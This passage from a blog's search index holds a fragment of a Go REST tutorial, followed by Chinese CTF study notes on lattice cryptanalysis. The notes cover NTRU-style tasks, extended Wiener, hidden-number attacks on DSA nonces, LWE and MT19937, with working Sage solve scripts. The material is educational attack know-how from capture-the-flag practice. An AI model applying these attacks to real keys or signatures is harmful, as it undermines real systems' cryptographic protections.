http.ResponseWriter, r *http.Request) { w.Header().Set(\"Content-Type\", \"application/json\") // 从 HTTP 请求 r 中提取路径参数，并将它们以 map[string]string 的形式返回 params := mux.Vars(r) // index 是当前元素的索引（即位置），它是一个整数值; item 是当前索引位置上的元素本身 for index, item := range movies { if item.ID == params[\"id\"] { // append(movies[:index], movies[index+1:]...) 实际上创建了一个新的切片，其中包含了删除指定元素后的所有元素。 movies = append(movies[:index], movies[index+1:]...) // break 语句用于退出 for 循环 break } } json.NewEncoder(w).Encode(movies) } // 拿一个电影 func getMovie(w http.ResponseWriter, r *http.Request) { w.Header().Set(\"Content-Type\",\"application/json\") params := mux.Vars(r) for _, item := range movies { if item.ID == params[\"id\"] { json.NewEncoder(w).Encode(item) return } } } // 增加一个电影 func createMovie(w http.ResponseWriter, r *http.Request) { w.Header().Set(\"Content-Type\", \"application/json\") var movie Movie // Decode(\u0026movie)：传入 movie 的指针，以便解码器可以直接修改 movie 变量的内容。 // _ 表示我们忽略 Decode 方法的返回值。如果解码过程发生错误，通常会记录错误信息而不是简单地忽略。 _ = json.NewDecoder(r.Body).Decode(\u0026movie) // rand.Intn(100000000)：生成一个随机整数，范围是 0 到 99999999（不包括 100000000）。 movie.ID = strconv.Itoa(rand.Intn(100000000)) // 将 movie 添加到 movies 切片的末尾。append 函数会创建一个新的切片（如果原切片空间不足），并将原切片和新元素合并到一起。 movies = append(movies, movie) json.NewEncoder(w).Encode(movie) } // 更新单个电影 func updateMovie(w http.ResponseWriter, r *http.Request) { // 设定响应头 Content-Type 为 application/json w.Header().Set(\"Content-Type\", \"application/json\") params := mux.Vars(r) for index, item := range movies { if item.ID == params[\"id\"] { // 删除原有电影 movies = append(movies[:index], movies[index+1:]...) // 创建新电影 var movie Movie // 创建一个 JSON 解码器，并从 HTTP 请求的主体中解码 JSON 数据到 `movie` 变量。 _ = json.NewDecoder(r.Body).Decode(\u0026movie) movie.ID = params[\"id\"] movies = append(movies, movie) json.NewEncoder(w).Encode(movies) return } } } ","date":"2025-07-07","objectID":"/study-golang1/:2:2","tags":["开发","study"],"title":"Study golang「1」","uri":"/study-golang1/"},{"categories":["golang"],"content":"关于测试接口 很多人都喜欢用POSTMAN这个软件，其实vsc里面是有这个插件的，可以使用，或者是用REST Client这个插件，手写GET/POST包发过去即可，前者比较轮椅 ","date":"2025-07-07","objectID":"/study-golang1/:2:3","tags":["开发","study"],"title":"Study golang「1」","uri":"/study-golang1/"},{"categories":["golang"],"content":"关于结构体标签 结构体里面定义的时候，一般后面都会加上json这个东西，主要的用途就是编码和解码、数据库字段映射、表单解析和 XML 编码和解码，如 //结构体标签最常见的用途是与 JSON 编码和解码相关。通过指定 JSON 标签，可以控制 JSON 数据中的字段名称和行为。 type Person struct { Name string `json:\"name\"` Age int `json:\"age\"` Email string `json:\"email\"` } // 当你使用 encoding/json 包对这个结构体进行编码时，json:\"name\" 标签指定了在 JSON 数据中应该使用 \"name\" 作为字段名。这使得 JSON 数据与 Go 结构体字段之间能够正确映射。 import ( \"encoding/json\" \"fmt\" ) func main() { p := Person{Name: \"Alice\", Age: 30, Email: \"alice@example.com\"} jsonData, _ := json.Marshal(p) fmt.Println(string(jsonData)) // 输出: {\"name\":\"Alice\",\"age\":30,\u003e\u003e\"email\":\"alice@example.com\"} } //------------------// // 结构体标签也可以用于数据库操作，通过标签指定字段名与数据库表中的列名之间的映射。 // 这里，gorm:\"column:user_name\" 标签指定了结构体字段 Name 对应数据库表中的 user_name 列。 type User struct { ID int `gorm:\"primary_key\"` Name string `gorm:\"column:user_name\"` Email string `gorm:\"column:user_email\"` } //------------------// // 在 Web 开发中，结构体标签可以用于表单解析，指定表单字段的名称与结构体字段之间的映射关系。例如，使用 gin 框架处理表单数据： // 在这个例子中，form:\"username\" 标签表示表单字段 username 将被映射到结构体字段 Username。 type LoginForm struct { Username string `form:\"username\"` Password string `form:\"password\"` } //------------------// // 除了 JSON，结构体标签也可以用于 XML 编码和解码。例如，使用 encoding/xml 包： // 这里，xml:\"title\" 标签指定了 XML 数据中字段名为 title，这在 XML 编码和解码时起作用。 type Book struct { Title string `xml:\"title\"` Author string `xml:\"author\"` } ","date":"2025-07-07","objectID":"/study-golang1/:2:4","tags":["开发","study"],"title":"Study golang「1」","uri":"/study-golang1/"},{"categories":["CTF"],"content":"前言 用来记录我的格密码学习，参考资料是NSS工坊和一些blog ","date":"2025-06-29","objectID":"/ge-1/:1:0","tags":["crypto"],"title":"格学习笔记","uri":"/ge-1/"},{"categories":["CTF"],"content":"NTRU ","date":"2025-06-29","objectID":"/ge-1/:2:0","tags":["crypto"],"title":"格学习笔记","uri":"/ge-1/"},{"categories":["CTF"],"content":"1.入门题 task.py import gmpy2 from secret import flag from Crypto.Util.number import * f = bytes_to_long(flag) p = getPrime(512) g = getPrime(128) h = gmpy2.invert(f+20192020202120222023, p) * g % p print('h =', h) print('p =', p) 想要flag就要求出f，f=f+20192020202120222023，最后减去这个数就好了，那么已知的式子就变成了 $$ h \\equiv f^{-1}g \\mod p \\\\ hf \\equiv g \\mod p \\\\ g=hf-kp \\\\ \\begin{pmatrix} f\u0026-k \\end{pmatrix} \\begin{pmatrix} 1\u0026h\\\\ 0\u0026p \\end{pmatrix}= \\begin{pmatrix} f\u0026g \\end{pmatrix} $$在本质的计算中，他是拿向量(h,1)(p,0)去做线性组合，如果两组是$x_1$$x_2$，那么就变成了 $x_1h+x_2p,x_1$，而当$x_1=f,x_2=-k$就是我们想要的结果 exp.sage from sage.all import* from Crypto.Util.number import * h = p = zsm=Matrix(ZZ,[[1,h],[0,p]]) f,g=zsm.LLL()[0] print(long_to_bytes(abs(f)-20192020202120222023)) 与此题相似的还有LitCTF2025的baby，不过那个需要配平一下 ","date":"2025-06-29","objectID":"/ge-1/:2:1","tags":["crypto"],"title":"格学习笔记","uri":"/ge-1/"},{"categories":["CTF"],"content":"2.HNCTF 2022 WEEK2 task.py from Crypto.Util.number import * from hashlib import * p = getPrime(2048) f = getPrime(1024) g = getPrime(768) h = pow(f,-1,p)*g%p verify = sha256(bytes.fromhex(hex(f+g)[2:])).hexdigest() print(f'verify = {verify}') print(f'p = {p}') print(f'h = {h}') print('NSSCTF{' + md5(bytes.fromhex(hex(f+g)[2:])).hexdigest() + '}') $$ h\\equiv f^{-1}g \\mod p \\\\ hf\\equiv g \\mod p \\\\ g=hf-kp \\\\ \\begin{pmatrix} f\u0026-k \\end{pmatrix} \\begin{pmatrix} 1\u0026h\\\\ 0\u0026p \\end{pmatrix}= \\begin{pmatrix} f\u0026g \\end{pmatrix} $$你会发现和上一题差不多的感觉() exp.sage from sage.all import* from Crypto.Util.number import * from hashlib import * verify = \"\" p = h = zsm=Matrix(ZZ,[[1,h],[0,p]]) f,g=zsm.LLL()[0] if sha256(bytes.fromhex(hex(abs(f)+abs(g))[2:])).hexdigest() == verify: flag = 'NSSCTF{' + md5(bytes.fromhex(hex(f+g)[2:])).hexdigest() + '}' print(flag) ","date":"2025-06-29","objectID":"/ge-1/:2:2","tags":["crypto"],"title":"格学习笔记","uri":"/ge-1/"},{"categories":["CTF"],"content":"3.不知道哪来的 task.py from Crypto.Util.number import * p = getPrime(1024) f = getPrime(400) g = getPrime(512) r = getPrime(400) h = inverse(f, p) * g % p m = b'******' m = bytes_to_long(m) c = (r*h + m) % p print(f'p = {p}') print(f'h = {h}') print(f'c = {c}') 先把h代入进去，然后化简 $$ c \\equiv (r \\times f^{-1} \\times g+m) \\mod p \\\\ fc \\equiv (rg+mf) \\mod p\\\\ mf \\equiv (fc-rg) \\mod p \\\\ mf \\equiv fc \\mod p \\mod g \\\\ m \\equiv (fc \\mod p) \\times f^{-1} \\mod g $$要求m就要知道fcpg，cp已知，求fg $$ \\begin{pmatrix} f\u0026-k \\end{pmatrix} \\begin{pmatrix} 1\u0026h\\\\ 0\u0026p \\end{pmatrix}= \\begin{pmatrix} f\u0026g \\end{pmatrix} $$exp.sage from sage.all import* from Crypto.Util.number import * p = h = c = zsm=Matrix(ZZ,[[1,h],[0,p]]) f,g=zsm.LLL()[0] f,g=abs(f),abs(g) m=((f*c%p)*inverse(f,g))%g print(long_to_bytes(m)) ","date":"2025-06-29","objectID":"/ge-1/:2:3","tags":["crypto"],"title":"格学习笔记","uri":"/ge-1/"},{"categories":["CTF"],"content":"4.深育杯2021 task.py from Crypto.Util.number import * import gmpy2 from flag import flag def encrypt(plaintext): p = getStrongPrime(3072) m = bytes_to_long(plaintext) r = getRandomNBitInteger(1024) while True: f = getRandomNBitInteger(1024) g = getStrongPrime(768) h = gmpy2.invert(f, p) * g % p c = (r * h + m * f) % p return (h, p, c) h, p, c = encrypt(flag) with open(\"cipher.txt\", \"w\") as f: f.write(\"h = \" + str(h) + \"\\n\") f.write(\"p = \" + str(p) + \"\\n\") f.write(\"c = \" + str(c) + \"\\n\") 格和前面构造的一样，主要是c的化简不一样，这里就省略了 ","date":"2025-06-29","objectID":"/ge-1/:2:4","tags":["crypto"],"title":"格学习笔记","uri":"/ge-1/"},{"categories":["CTF"],"content":"NSS工坊题目 ","date":"2025-06-29","objectID":"/ge-1/:3:0","tags":["crypto"],"title":"格学习笔记","uri":"/ge-1/"},{"categories":["CTF"],"content":"P3 task.py from Crypto.Util.number import * import random flag = b'******' m = bytes_to_long(flag) a = getPrime(1024) b = getPrime(1536) p = getPrime(512) q = getPrime(512) r = random.randint(2**14, 2**15) assert ((p-r) * a + q) % b \u003c 50 c = pow(m, 65537, p*q) print(f'c = {c}') print(f'a = {a}') print(f'b = {b}') $$ x \\equiv ((p-r) \\times a+q) \\mod b \\\\ x-q \\equiv (p-r)\\times a \\mod b \\\\ x-q=(p-r)\\times a+kb \\\\ \\begin{pmatrix} p-r\u0026k \\end{pmatrix} \\begin{pmatrix} a\u00261\\\\ b\u00260 \\end{pmatrix}= \\begin{pmatrix} x-q\u0026p-r \\end{pmatrix} $$xr都是很小的数，可以爆破，值得注意的是，先爆破r再爆破x会快一点xd exp.sage from sage.all import* from Crypto.Util.number import * c = a = b = e=65537 zsm=Matrix(ZZ,[[a,1],[b,0]]) xq,pr=zsm.LLL()[0] xq,pr=abs(xq),abs(pr) for r in range(2**14,2**15): for x in range(50): p=pr+r q=x+xq n=p*q d=inverse(e,(p-1)*(q-1)) m=pow(c,d,n) flag=long_to_bytes(m) if b'NSSCTF{' in flag: print(flag) break ","date":"2025-06-29","objectID":"/ge-1/:3:1","tags":["crypto"],"title":"格学习笔记","uri":"/ge-1/"},{"categories":["CTF"],"content":"P4 task.py from Crypto.Util.number import * from gmpy2 import * flag = b'******' flag = bytes_to_long(flag) p = getPrime(1024) r = getPrime(175) a = inverse(r, p) a = (a*flag) % p print(f'a = {a}') print(f'p = {p}') $$ a\\equiv r^{-1}flag \\mod p \\\\ flag=ar+kp \\\\ \\begin{pmatrix} r\u0026k \\end{pmatrix} \\begin{pmatrix} a\u00262^{170}\\\\ p\u00260 \\end{pmatrix}= \\begin{pmatrix} flag\u00262^{170}r \\end{pmatrix} $$exp.sage from sage.all import* from Crypto.Util.number import * a = p = e=65537 zsm=Matrix(ZZ,[[a,2**170],[p,0]]) flag,R=zsm.LLL()[0] flag,R=abs(flag),abs(R) print(long_to_bytes(flag)) ","date":"2025-06-29","objectID":"/ge-1/:3:2","tags":["crypto"],"title":"格学习笔记","uri":"/ge-1/"},{"categories":["CTF"],"content":"P5 task.py from Crypto.Util.number import * from gmpy2 import * flag = b'******' m = bytes_to_long(flag) assert m.bit_length() == 351 p = getPrime(1024) b = getPrime(1024) c = getPrime(400) a = (b*m + c) % p print(f'a = {a}') print(f'b = {b}') print(f'p = {p}') $$ c=a-bm+kp\\\\ \\begin{pmatrix} 1\u0026m\u0026k \\end{pmatrix} \\begin{pmatrix} a\u00260\u00262^{351}\\\\ -b\u00261\u00260\\\\ p\u00260\u00260 \\end{pmatrix}= \\begin{pmatrix} c\u0026m\u00262^{351} \\end{pmatrix} $$exp.sage from sage.all import* from Crypto.Util.number import * a = b = p = zsm=Matrix(ZZ,[[a,0,2**351],[-b,1,0],[p,0,0]]) c,m,x=zsm.LLL()[0] c,m,x=abs(c),abs(m),abs(x) print(long_to_bytes(m)) ","date":"2025-06-29","objectID":"/ge-1/:3:3","tags":["crypto"],"title":"格学习笔记","uri":"/ge-1/"},{"categories":["CTF"],"content":"P6 task.py from Crypto.Util.number import * flag = b'******' flag = bytes_to_long(flag) d = getPrime(400) for i in range(4): p = getPrime(512) q = getPrime(512) n = p * q e = inverse(d, (p-1)*(q-1)) c = pow(flag, e, n) print(f'e{i} =', e) print(f'n{i} =', n) print(f'c{i} =', c) 原型应该是NUSTCTF 2022 新生赛的一个论文题，IJCSI-9-2-1-311-314 具体实现方法是把最大的n开根号赋值给M，然后还有$e_id=1+k_i\\phi N_i$，然后这里假设了phi可以写作N-s，使式子变成了 $$ e_id=1+k_i(N_i-s_i)\\\\ e_id-k_iN_i=1-k_is_i\\\\ 我们还有一个式子dM=dM\\\\ 可以写成矩阵相乘\\\\ \\begin{pmatrix} d \u0026 k_1 \u0026 k_2 \u0026 \\dots \u0026 k_i \\end{pmatrix} \\begin{pmatrix} M \u0026 e_1 \u0026 e_2 \u0026 \\dots \u0026 e_i \\\\ 0 \u0026 -N_1 \u0026 0 \u0026 \\dots \u0026 0 \\\\ 0 \u0026 0 \u0026 -N_2 \u0026 \\dots \u0026 0 \\\\ \\vdots \u0026 \\vdots \u0026 \\vdots \u0026 \\ddots \u0026 \\vdots \\\\ 0 \u0026 0 \u0026 0 \u0026 \\dots \u0026 -N_i \\end{pmatrix}= \\begin{pmatrix} dM \u0026 1 - k_1 s_1 \u0026 1 - k_2 s_2 \u0026 \\dots \u0026 1 - k_is_i \\end{pmatrix} $$exp.sage from Crypto.Util.number import * from sage.all import* M = isqrt(n0) L = Matrix(ZZ, [[M, e0, e1, e2, e3], [0,-n0, 0, 0, 0], [0, 0,-n1, 0, 0], [0, 0, 0,-n2, 0], [0, 0, 0, 0,-n3]]) d = abs(L.LLL()[0][0]) // M m = power_mod(c0, d, n0) print(long_to_bytes(m)) ","date":"2025-06-29","objectID":"/ge-1/:3:4","tags":["crypto"],"title":"格学习笔记","uri":"/ge-1/"},{"categories":["CTF"],"content":"P7 task.py from Crypto.Util.number import * flag = b'******' flag = bytes_to_long(flag) p = getPrime(512) q = getPrime(512) n = p * q c = pow(flag, 65537, n) print(f'n =', n) print(f'c =', c) for i in range(2): d = getPrime(350) e = inverse(d, (p-1)*(q-1)) print(f'e{i} =', e) 这个其实就是维纳拓展攻击，从一元变成了二元，直接上脚本了 exp.sage from Crypto.Util.number import * n = c = e0 = e1 = a = 5/14 D = diagonal_matrix(ZZ, [n, int(n^(1/2)), int(n^(1+a)), 1]) M = Matrix(ZZ, [[1, -n, 0, n^2], [0, e0, -e0, -e0*n], [0, 0, e1, -e1*n], [0, 0, 0, e0*e1]])*D L = M.LLL() t = vector(ZZ, L[0]) x = t * M^(-1) x * M = t phi = int(x[1]/x[0]*e0) d = inverse_mod(65537, phi) m = power_mod(c, d, n) print(long_to_bytes(m)) ","date":"2025-06-29","objectID":"/ge-1/:3:5","tags":["crypto"],"title":"格学习笔记","uri":"/ge-1/"},{"categories":["CTF"],"content":"P8 task.py from Crypto.Util.number import * flag = b'******' m = bytes_to_long(flag) p = getPrime(512) s = [getPrime(32) for i in range(3)] a = [getPrime(512) for i in range(3)] c = (a[0]*s[0]**2*s[1]**2 + a[1]*s[0]*s[2]**2 + a[2]*s[1]*s[2]) % p flag = m*s[0]*s[1]*s[2] print(f'c = {c}') print(f'flag = {flag}') print(f'a = {a}') print(f'p = {p}') 目的是求s，要对这个式子变形，想办法使未知量在一侧 $$ -s_1s_2=a_0a^{-1}_2s_0^{2}s_1^{2}+a_1a_2^{-1}s_0s_2^{2}-ca_2^{-1}+kp \\\\ \\begin{pmatrix} s_0^{2}s_1^{2}\u0026s_0s_2^{2}\u00261\u0026k \\end{pmatrix} \\begin{pmatrix} a_0a^{-1}_2\u00260\u00260\u00261\\\\ a_1a_2^{-1}\u00260\u00261\u00260\\\\ -ca_2^{-1}\u00261\u00260\u00260\\\\ p\u00260\u00260\u00260 \\end{pmatrix}= \\begin{pmatrix} -s_1s_2\u00261\u0026s_0s_2^{2}\u0026s_0^{2}s_1^{2} \\end{pmatrix} $$发现直接这样打出不来，配平一下 exp.sage from Crypto.Util.number import * c = flag = a = [] p = ia = inverse_mod(a[2], p) L = Matrix(ZZ, [[a[0]*ia%p, 0, 0, 1], [a[1]*ia%p, 0, 1, 0], [-c*ia%p, 1, 0, 0 ], [p, 0, 0, 0]]) * diagonal_matrix(ZZ, [1, 2^32, 2^128, 2^64]) v = L.LLL()[0] s0s1 = isqrt(abs(v[0])) s1s2 = abs(v[3]) \u003e\u003e 64 s1 = gcd(s0s1, s1s2) s0 = s0s1 // s1 s2 = s1s2 // s1 flag = flag // s0 // s1 // s2 print(long_to_bytes(flag)) ","date":"2025-06-29","objectID":"/ge-1/:3:6","tags":["crypto"],"title":"格学习笔记","uri":"/ge-1/"},{"categories":["CTF"],"content":"HNP问题 形式比较固定，一般长这样$k_i\\equiv A_ix+B_i \\mod p$，我们一般会有多组kAB，所以我们可以依靠这个去建格。 这种式子经常出现在DSA签名中 $$ r \\equiv g^k \\mod q \\\\ s \\equiv k^{-1}(H(m)+xr) \\mod q \\\\ k_i \\equiv s_i^{-1}r_ix+s_i^{-1}H(m) \\mod q \\\\ A=s_i^{-1}r_i,B=s_i^{-1}H(m) \\\\ k_i=A_ix+B+l_iq $$这就是一个非常标准的HNP了，建一个格 $$ \\begin{pmatrix} l_1 \u0026 l_2 \u0026 \\dots \u0026 l_i \u0026x \u0026 1 \\end{pmatrix} \\begin{pmatrix} q \u0026 0 \u0026 \\dots \u0026 0 \u0026 0 \u0026 0 \\\\ 0 \u0026 0 \u0026 \\dots \u0026 0 \u0026 0 \u0026 0\\\\ 0 \u0026 0 \u0026 \\ddots \u0026 0 \u0026 0 \u0026 0\\\\ \\vdots \u0026 \\vdots \u0026 \\vdots \u0026 q \u0026 \\vdots \u0026 \\vdots\\\\ A_1 \u0026 A_2 \u0026 \\dots \u0026 A_i \u0026 K/q \u0026 0\\\\ B_1 \u0026 B_2 \u0026 \\dots \u0026 B_i \u0026 0 \u0026 K \\end{pmatrix}= \\begin{pmatrix} k_1 \u0026 k_2 \u0026 \\dots \u0026 k_i \u0026 Kx/q \u0026 K \\end{pmatrix} $$对应脚本 import json t = 40 # Load data f = open(\"data\", \"r\") (q, Hm_s, r_s, s_s) = json.load(f) # Calculate A \u0026 B A = [] B = [] for r, s, Hm in zip(r_s, s_s, Hm_s): A.append( ZZ( (inverse_mod(s, q)*r) % q ) ) B.append( ZZ( (inverse_mod(s, q)*Hm) % q ) ) # Construct Lattice K = 2^122 # ki \u003c 2^122 X = q * identity_matrix(QQ, t) # t * t Z = matrix(QQ, [0] * t + [K/q] + [0]).transpose() # t+1 column Z2 = matrix(QQ, [0] * (t+1) + [K]).transpose() # t+2 column Y = block_matrix([[X],[matrix(QQ, A)], [matrix(QQ, B)]]) # (t+2) * t Y = block_matrix([[Y, Z, Z2]]) # Find short vector Y = Y.LLL() # check k0 = ZZ(Y[1, 0] % q) x = ZZ(Y[1, -2] / (K/q) % q) assert(k0 == (A[0]*x + B[0]) % q) print(x) /** * 复制并使用代码请注明引用出处哦~ * Lazzaro @ https://lazzzaro.github.io */ 当然现在LCG的题目里面也有HNP了，比如LCG已知state高位求seed/LCG未知a,b求seed，这种题目在0xGame中是出现过的 ","date":"2025-06-29","objectID":"/ge-1/:4:0","tags":["crypto"],"title":"格学习笔记","uri":"/ge-1/"},{"categories":["CTF"],"content":"1.2023闽盾杯 task.py from random import randbytes from hashlib import sha256 from secret import FLAG prime_q = prime_p = 2 * prime_q + 1 generator = 2 def generate_keys(prime_p:int, prime_q: int, generator: int): private_key = int(randbytes(48).hex(), 16) public_key = pow(generator, private_key, prime_p) return private_key, public_key def signature(m: str, private_key: int): ephemeral_key = pow(int.from_bytes(m.encode(), \"big\"), -1, prime_q) value_r = pow(generator, ephemeral_key, prime_p) % prime_q hash_value = sha256(m.encode()).hexdigest() value_s = pow(ephemeral_key, -1, prime_q) * (int(hash_value, 16) + private_key * value_r) % prime_q return hash_value, value_r, value_s def verification(message_hash: str, value_r: int, value_s: int, public_key: int): message_hash = int(message_hash, 16) inverse_s = pow(value_s, -1, prime_q) u1 = message_hash * inverse_s % prime_q u2 = value_r * inverse_s % prime_q value_v = (pow(generator, u1, prime_p) * pow(public_key, u2, prime_p) % prime_p) % prime_q return value_v == value_r private_key, public_key = generate_keys(prime_p, prime_q, generator) print(f\"prime_p = {prime_p}\") print(f\"prime_q = {prime_q}\") print(f\"generator = {generator}\") print(f\"public_key = {public_key}\") hash_value, value_r, value_s = signature(FLAG, private_key) assert verification(hash_value, value_r, value_s, public_key) print(\"FLAG= *******************************\") print(f\"Here is your gift = {hash_value}\") print(f\"value_r = {value_r}\") print(f\"value_s = {value_s}\") 先看看代码，可以看见他把flag加密完带进去当ephemeral_key了，按照上面的式子来说就是 $$ m=k^{-1},hash(m)=H\\\\ s\\equiv k^{-1}\\times (H+xr) \\mod q \\\\ m=sH^{-1}-mxrH^{-1}+kq \\\\ sH^{-1}=B,-rH^{-1}=A,mx=t\\\\ m=At+B+kq\\\\ \\begin{pmatrix} k \u0026 t \u0026 1 \\end{pmatrix} \\begin{pmatrix} q\u00260\u00260\\\\ A\u00261/2^{384}\u00260\\\\ B\u00260\u00262^{320} \\end{pmatrix}= \\begin{pmatrix} m\u0026t/2^{384}\u00262^{320} \\end{pmatrix} $$这边配平是因为只打格出不来，就改改，能跑出来就行() exp.sage import gmpy2 from Crypto.Util.number import * p = q = g = 2 pb = h = '' r = s = H = int(h,16) inv = gmpy2.invert(H,q) A = -r*inv B = s*inv M = [[q,0,0], [A,1/2^384,0], [B,0,2^320]] Ge = Matrix(M) for i in Ge.LLL(): if i[-1] == 2^320: m = i[0] print(long_to_bytes(int(m))) ","date":"2025-06-29","objectID":"/ge-1/:4:1","tags":["crypto"],"title":"格学习笔记","uri":"/ge-1/"},{"categories":["CTF"],"content":"2.BabyHNP task.py from secret import flag from random import randint import libnum import os assert len(flag) == 44 def padding(f): return f + os.urandom(64 - 1 - len(f)) n = 5 m = libnum.s2n(padding(flag)) q = libnum.generate_prime(512) A = [randint(1, q) for i in range(n)] B = [A[i] * m % q for i in range(n)] b = [B[i] % 2**128 for i in range(n)] print('q = %s' % q) print('A = %s' % A) print('b = %s' % b) $$ B_i=b_i+k\\times 2^{128} \\\\ b_i+k_i\\times 2^{128}\\equiv A_im \\mod q \\\\ k_i=A_im\\times (2^{-128} \\mod q)-b_i\\times (2^{-128} \\mod q)+l_iq $$这个就和上面的格一模一样了，直接构建就行了 exp.sage from gmpy2 import * from Crypto.Util.number import * p = B = [, , , , ] R = [, , , , ] n = len(R) M = Matrix(QQ,n+2,n+2) inv = invert(2 ** 128,p) for i in range(n): M[i,i] = p M[-2,i] = B[i] * inv M[-1,i] = -R[i] * inv t = 1 / 2^128 K = 2^384 M[-2,-2] = t M[-1,-1] = K L = M.LLL() x = L[1][-2] // t m = x % p print(int(m).bit_length()) print(long_to_bytes(int(m))) 看了好多师傅的博客，感觉HNP都可以建成这个格，主要难的还是化简构造，得自己多练练，找到这种建格去打的感觉才行 ","date":"2025-06-29","objectID":"/ge-1/:4:2","tags":["crypto"],"title":"格学习笔记","uri":"/ge-1/"},{"categories":["CTF"],"content":"HSP\u0026HSSP HSP在我的认知里就是背包的升级版？或者说背包就是一种HSP，而HSSP是一种正交格，这个真的不会，看Tover神的博客吧，我只会套脚本 ","date":"2025-06-29","objectID":"/ge-1/:5:0","tags":["crypto"],"title":"格学习笔记","uri":"/ge-1/"},{"categories":["CTF"],"content":"LWE 这种问题的特点在于有一个噪音e(一般比较小)，比如原式子是$Ax=b$，加入噪音之后变成了$Ax+e=b$，在未知x和e的情况下，我们就可以通过建格去先求出e，然后解方程求出x，构建这个格就行了 $$ \\begin{pmatrix} A \u00260\\\\ -b\u00261 \\end{pmatrix} $$","date":"2025-06-29","objectID":"/ge-1/:6:0","tags":["crypto"],"title":"格学习笔记","uri":"/ge-1/"},{"categories":["CTF"],"content":"SUSCTF2022 task.py import numpy as np from secret import flag def gravity(n,d=0.25): A=np.zeros([n,n]) for i in range(n): for j in range(n): A[i,j]=d/n*(d**2+((i-j)/n)**2)**(-1.5) return A n=len(flag) A=gravity(n) x=np.array(list(flag)) b=A@x np.savetxt('b.txt',b) b已经给出，那么可以知道矩阵的维度，那么就可以恢复出A，再按照上面的格去打出e就行了 exp.sage import numpy as np def gravity(n,d=0.25): A=np.zeros([n,n]) for i in range(n): for j in range(n): A[i,j]=d/n*(d**2+((i-j)/n)**2)**(-1.5) return A b = [] for i in open('b.txt','r').readlines(): b.append(float(i.strip())) n = 85 A = gravity(85) t = 10^21 for i in range(len(b)): b[i] = -b[i] * t for i in range(n): for j in range(n): A[i,j] = A[i,j] * t M = Matrix(ZZ,n+1,n+1) for i in range(n): M[-1,i] = b[i] for j in range(n): M[i,j] = A[i,j] M[-1,-1] = 1 e = M.LLL()[0] flag = M.solve_left(e) print(bytes(flag[:-1])) ","date":"2025-06-29","objectID":"/ge-1/:6:1","tags":["crypto"],"title":"格学习笔记","uri":"/ge-1/"},{"categories":["CTF"],"content":"常用脚本 这里直接搬la佬的了 #脚本1-小规模 #Sage from sage.modules.free_module_integer import IntegerLattice row = column = prime = ma = res = W = matrix(ZZ, ma) cc = vector(ZZ, res) # Babai's Nearest Plane algorithm def Babai_closest_vector(M, G, target): small = target for _ in range(5): for i in reversed(range(M.nrows())): c = ((small * G[i]) / (G[i] * G[i])).round() small -= M[i] * c return target - small A1 = matrix.identity(column) Ap = matrix.identity(row) * prime B = block_matrix([[Ap], [W]]) lattice = IntegerLattice(B, lll_reduce=True) print(\"LLL done\") gram = lattice.reduced_basis.gram_schmidt()[0] target = vector(ZZ, res) re = Babai_closest_vector(lattice.reduced_basis, gram, target) print(\"Closest Vector: {}\".format(re)) R = IntegerModRing(prime) M = Matrix(R, ma) M = M.transpose() ingredients = M.solve_right(re) print(\"Ingredients: {}\".format(ingredients)) m = '' for i in range(len(ingredients)): m += chr(ingredients[i]) print(m) #脚本2-大规模 #Sage from sage.modules.free_module_integer import IntegerLattice from random import randint import sys from itertools import starmap from operator import mul # Babai's Nearest Plane algorithm # from: http://mslc.ctf.su/wp/plaidctf-2016-sexec-crypto-300/ def Babai_closest_vector(M, G, target): small = target for _ in range(1): for i in reversed(range(M.nrows())): c = ((small * G[i]) / (G[i] * G[i])).round() small -= M[i] * c return target - small m = n = q = A_values = b_values = A = matrix(ZZ, m + n, m) for i in range(m): A[i, i] = q for x in range(m): for y in range(n): A[m + y, x] = A_values[x][y] lattice = IntegerLattice(A, lll_reduce=True) print(\"LLL done\") gram = lattice.reduced_basis.gram_schmidt()[0] target = vector(ZZ, b_values) res = Babai_closest_vector(lattice.reduced_basis, gram, target) print(\"Closest Vector: {}\".format(res)) R = IntegerModRing(q) M = Matrix(R, A_values) ingredients = M.solve_right(res) print(\"Ingredients: {}\".format(ingredients)) for row, b in zip(A_values, b_values): effect = sum(starmap(mul, zip(map(int, ingredients), row))) % q assert(abs(b - effect) \u003c 2 ** 37) print(\"ok\") ","date":"2025-06-29","objectID":"/ge-1/:6:2","tags":["crypto"],"title":"格学习笔记","uri":"/ge-1/"},{"categories":["CTF"],"content":"算法描述 ","date":"2025-06-28","objectID":"/mt19937/:1:0","tags":["crypto"],"title":"MT19937","uri":"/mt19937/"},{"categories":["CTF"],"content":"主要步骤 利用 seed 初始化寄存器状态 对寄存器状态进行旋转 根据寄存器状态提取伪随机数 初始化可能用的是固定的种子，也有可能是服务器时间戳，生成一个长度为624的状态数组，填充完后作为初始状态 旋转的目的是增加不确定性还有均匀性，主要是位运算实现的线性变换 提取伪随机数这一步会从状态数组中依次提取一个整数，并对其进行位运算和异或运算，生成的数即为输出的伪随机数。当所有数组全被遍历过之后，就会对状态数组再次进行一次旋转，重新生成新的状态数组。 ","date":"2025-06-28","objectID":"/mt19937/:1:1","tags":["crypto"],"title":"MT19937","uri":"/mt19937/"},{"categories":["CTF"],"content":"python代码实现 这是一个简单的实现代码 def _int32(x): return int(0xFFFFFFFF \u0026 x) class MT19937: # 初始化 def __init__(self, seed): self.mt = [0] * 624 self.mt[0] = seed self.mti = 0 for i in range(1, 624): self.mt[i] = _int32(1812433253 * (self.mt[i - 1] ^ self.mt[i - 1] \u003e\u003e 30) + i) # 提取伪随机数 def extract_number(self): if self.mti == 0: self.twist() y = self.mt[self.mti] y = y ^ y \u003e\u003e 11 y = y ^ y \u003c\u003c 7 \u0026 2636928640 y = y ^ y \u003c\u003c 15 \u0026 4022730752 y = y ^ y \u003e\u003e 18 self.mti = (self.mti + 1) % 624 return _int32(y) # 旋转状态 def twist(self): for i in range(0, 624): y = _int32((self.mt[i] \u0026 0x80000000) + (self.mt[(i + 1) % 624] \u0026 0x7fffffff)) self.mt[i] = (y \u003e\u003e 1) ^ self.mt[(i + 397) % 624] if y % 2 != 0: self.mt[i] = self.mt[i] ^ 0x9908b0df 为什么说是简单的生成方法呢？可能知道python的random库也是MT19937生成伪随机数，但是它对 seed 的传入经过了两步处理 init_genrand和 init_by_array，因此和上面的实现是有区别的，也就是说两者产生的状态矩阵和伪随机数是不一样的。 ","date":"2025-06-28","objectID":"/mt19937/:1:2","tags":["crypto"],"title":"MT19937","uri":"/mt19937/"},{"categories":["CTF"],"content":"逆向extract_number 这里跟随xenny老师的思路走，就拿y = y ^ y \u003c\u003c 7 \u0026 2636928640举例 那么整个式子就是 $$ y=x \\oplus 